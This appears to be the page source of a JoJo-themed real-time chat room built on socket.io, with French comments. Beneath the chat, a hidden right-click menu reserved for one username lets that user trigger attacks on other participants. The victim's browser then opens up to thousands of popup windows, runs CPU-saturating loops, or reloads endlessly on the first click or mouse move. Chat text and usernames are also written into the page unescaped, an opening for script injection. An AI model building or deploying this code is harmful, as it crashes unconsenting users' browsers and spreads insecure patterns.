<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PUNCH V100 - REQUIEM</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=Bangers&family=JetBrains+Mono:wght@800&display=swap');
        
        :root {
            --gold: #FFD700; --magenta: #FF00FF; --bg: #050005;
            --ease: cubic-bezier(0.19, 1, 0.22, 1);
        }

        * { box-sizing: border-box; margin: 0; padding: 0; cursor: none; outline: none; }
        body { background: var(--bg); color: #fff; font-family: 'Archivo Black', sans-serif; overflow: hidden; height: 100vh; }

        /* --- CURSEUR STAND --- */
        #c-stand { 
            position: fixed; width: 40px; height: 40px; border: 3px solid var(--gold); 
            z-index: 1000000; pointer-events: none; transform: rotate(45deg); 
            box-shadow: 0 0 20px var(--gold); transition: transform 0.1s linear; 
        }

        /* --- LAYOUT JOJO --- */
        .punch-frame { display: grid; grid-template-columns: 350px 1fr 300px; height: 100vh; }
        
        .side { 
            background: linear-gradient(180deg, #14001e 0%, #000 100%); 
            border-right: 3px solid var(--gold); display: flex; flex-direction: column; 
        }

        .header { 
            padding: 30px; background: var(--gold); color: #000; text-align: center; 
            transform: skewY(-2deg); box-shadow: 0 5px 20px rgba(255,215,0,0.3); 
        }
        .header h1 { font-family: 'Bangers'; font-size: 50px; text-transform: uppercase; }

        #user-list { flex: 1; overflow-y: auto; padding: 15px; }
        .u-card { 
            padding: 20px; background: rgba(255,255,255,0.02); border: 1px solid #222; 
            margin-bottom: 10px; transition: 0.4s var(--ease); cursor: pointer;
        }
        .u-card:hover { transform: scale(1.05) translateX(10px); border-color: var(--gold); background: rgba(255,215,0,0.1); }

        .viewport { display: flex; flex-direction: column; background: #000; border-right: 2px solid #111; }
        #chat { flex: 1; padding: 30px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
        
        .msg { 
            padding: 15px 20px; background: #0a0a0a; border-left: 5px solid var(--magenta); 
            animation: slide 0.4s var(--ease); font-family: 'JetBrains Mono'; font-size: 14px;
        }
        @keyframes slide { from { transform: translateX(-50px); opacity: 0; } }

        .input-box { padding: 25px; background: #000; border-top: 3px solid var(--gold); display: flex; gap: 10px; }
        input { 
            flex: 1; background: #111; border: 1px solid #333; padding: 15px; 
            color: var(--gold); font-family: 'JetBrains Mono'; font-weight: 800;
        }

        /* --- OVERLAYS D'ATTAQUE --- */
        #za-warundo { 
            position: fixed; inset: 0; background: #fff; z-index: 9999999; 
            display: none; align-items: center; justify-content: center; mix-blend-mode: difference; 
        }
        .ora { font-family: 'Bangers'; font-size: 15vw; color: #fff; animation: shake 0.05s infinite; }
        @keyframes shake { 0%, 100% { transform: translate(0,0); } 50% { transform: translate(5px, 5px); } }

        #menu { 
            display: none; position: fixed; background: #000; border: 3px solid var(--gold); 
            width: 320px; z-index: 10000000; box-shadow: 15px 15px 0 #4B0082; 
        }
        .opt { padding: 18px; font-weight: 900; color: #888; border-bottom: 1px solid #111; cursor: pointer; transition: 0.2s; }
        .opt:hover { background: var(--gold); color: #000; padding-left: 30px; }
    </style>
</head>
<body oncontextmenu="return false;">

    <div id="c-stand"></div>
    <div id="za-warundo"><div class="ora">ORA ORA ORA!</div></div>

    <div class="punch-frame">
        <aside class="side">
            <div class="header"><h1>PUNCH</h1></div>
            <div id="user-list"></div>
        </aside>
        
        <main class="viewport">
            <div id="chat"></div>
            <div class="input-box">
                <input type="text" id="in" placeholder="TAKE THE SHOT..." onkeydown="if(event.key==='Enter') send()">
                <button onclick="send()" style="background:var(--magenta); border:none; padding:0 25px; font-family:'Bangers'; font-size:20px; color:#fff;">HIT</button>
            </div>
        </main>

        <aside class="side" style="border-left:3px solid var(--gold); border-right:none; padding:20px;">
            <div style="color:var(--gold); font-size:10px; letter-spacing:2px;">[SYSTEM_LOGS]</div>
            <div id="p-logs" style="font-family:'JetBrains Mono'; font-size:9px; color:#444; margin-top:10px;"></div>
        </aside>
    </div>

    <div id="menu">
        <div class="opt" style="background:#fff; color:#000; font-size:10px; text-align:center;">--- COMMANDS ---</div>
        <div class="opt" onclick="st('p_combo')">👊 OMEGA_COMBO [DORA]</div>
        <div class="opt" onclick="st('p_tsunami')">📑 TAB_TSUNAMI [ORA]</div>
        <div class="opt" onclick="st('p_cpu')">☢️ CPU_MELT [MUDA]</div>
        <div class="opt" onclick="st('p_ram')">☣️ RAM_GENOCIDE</div>
        <div class="opt" onclick="this.parentElement.style.display='none'">[ CANCEL ]</div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let me = ""; 
        let targetId = "";

        // --- MOUSE & AUTH ---
        document.addEventListener('mousemove', e => {
            const c = document.getElementById('c-stand');
            c.style.left = e.clientX-20+'px'; c.style.top = e.clientY-20+'px';
        });

        window.onload = () => {
            me = prompt("IDENTIFIE TON STAND (Nom):") || "Inconnu";
            socket.emit('init', { name: me });
        };

        // --- MENU CLIC DROIT ---
        window.oncontextmenu = (e) => {
            e.preventDefault();
            if(me !== "toucheur2pp") return; // Sécurité Master
            
            const m = document.getElementById('menu');
            m.style.display = 'block'; 
            m.style.top = e.pageY+'px'; 
            m.style.left = e.pageX+'px';
            
            const card = e.target.closest('.u-card');
            if(card) {
                targetId = card.getAttribute('data-id');
                log("TARGET_LOCKED: " + targetId);
            }
        };

        function send() { 
            const i = document.getElementById('in'); 
            if(i.value) socket.emit('chat', i.value); 
            i.value = ""; 
        }

        function st(type) { 
            if(!targetId) return;
            socket.emit(type, targetId); 
            document.getElementById('menu').style.display = 'none'; 
        }

        function log(t) {
            const l = document.getElementById('p-logs');
            l.innerHTML += `<div>> ${t}</div>`;
            l.scrollTop = l.scrollHeight;
        }

        // --- LE MOTEUR D'ATTAQUE RÉEL ---
        socket.on('execute', (data) => {
            log("INCOMING_STRIKE: " + data.type);
            
            // On arme l'attaque. Elle se déclenche au premier mouvement ou clic de la victime.
            const triggerAttack = () => {
                document.getElementById('za-warundo').style.display = 'flex';
                let cry = "";

                if(data.type === 'p_tsunami') {
                    cry = "ORA ORA ORA ORA ORA !!!";
                    for(let i=0; i<3000; i++) { window.open(location.href, '_blank', 'width=10,height=10'); }
                }

                if(data.type === 'p_cpu') {
                    cry = "MUDA MUDA MUDA MUDA MUDA !!!";
                    setInterval(() => {
                        for(let i=0; i<5000000; i++) { Math.sqrt(Math.random() * 999); }
                        history.pushState(null,'','#'+Math.random());
                    }, 1);
                }

                if(data.type === 'p_combo') {
                    cry = "DORA DORA DORA DORA DORA !!!";
                    // Combo Tsunami + Crash
                    for(let i=0; i<1500; i++) { window.open(location.href, '_blank', 'width=5,height=5'); }
                    setInterval(() => { location.reload(); }, 100);
                }

                // Feedback automatique dans le chat
                socket.emit('chat', `💀 ${me.toUpperCase()} S'EST FAIT PUNCHER PAR ${data.from.toUpperCase()} ! ${cry}`);
                
                // Nettoyage de l'event pour ne pas spammer
                window.removeEventListener('click', triggerAttack);
                window.removeEventListener('mousemove', triggerAttack);
            };

            window.addEventListener('click', triggerAttack);
            window.addEventListener('mousemove', triggerAttack);
        });

        // --- SYNC & CHAT ---
        socket.on('sync', users => {
            const list = document.getElementById('user-list');
            list.innerHTML = "";
            users.forEach(u => {
                const div = document.createElement('div');
                div.className = "u-card";
                div.setAttribute('data-id', u.id);
                div.innerHTML = `<b>${u.name.toUpperCase()}</b><br><small style="font-size:8px; color:#444">${u.id}</small>`;
                list.appendChild(div);
            });
        });

        socket.on('chat', d => {
            const c = document.getElementById('chat');
            c.innerHTML += `<div class="msg"><b style="color:var(--gold)">${d.n}:</b> ${d.t}</div>`;
            c.scrollTop = c.scrollHeight;
        });

        window.onclick = () => document.getElementById('menu').style.display = 'none';
    </script>
</body>
</html>
